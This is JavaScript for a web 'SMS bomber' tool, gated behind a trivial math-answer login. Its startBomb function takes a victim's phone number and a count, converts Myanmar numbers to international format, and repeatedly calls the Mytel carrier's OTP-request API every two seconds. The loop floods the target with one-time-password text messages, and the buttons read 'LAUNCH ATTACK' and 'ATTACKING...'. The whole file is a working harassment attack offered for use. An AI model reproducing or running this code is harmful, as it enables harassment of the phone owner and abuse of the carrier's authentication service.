function checkMath() {
    const val = document.getElementById('answerInput').value;
    
    if (val === "1") {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('controlPanel').style.display = 'block';
    } else {
        alert("Wrong answer 🙂");
        document.getElementById('answerInput').value = ""; 
    }
}

async function startBomb() {
    let p = document.getElementById('phone').value;
    let c = parseInt(document.getElementById('smsCount').value);

    if(!p || !c) { alert("အချက်အလက် အကုန်ဖြည့်ပါ!"); return; }
    if(p.startsWith('09')) { p = '95' + p.substring(1); }

    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.innerText = "ATTACKING...";
    
    document.getElementById('pContainer').style.display = 'block';
    document.getElementById('counterArea').style.display = 'flex';

    for(let i = 1; i <= c; i++) {
        document.getElementById('sentVal').innerText = i;
        document.getElementById('leftVal').innerText = c - i;
        
        let percent = (i / c) * 100;
        document.getElementById('pBar').style.width = percent + "%";

        try {
            await fetch(`https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${p}`, {
                mode: 'no-cors'
            });
        } catch(e) {}

        await new Promise(r => setTimeout(r, 2000));
    }
    
    alert("Attack Completed!");
    btn.disabled = false;
    btn.innerText = "LAUNCH ATTACK";

}
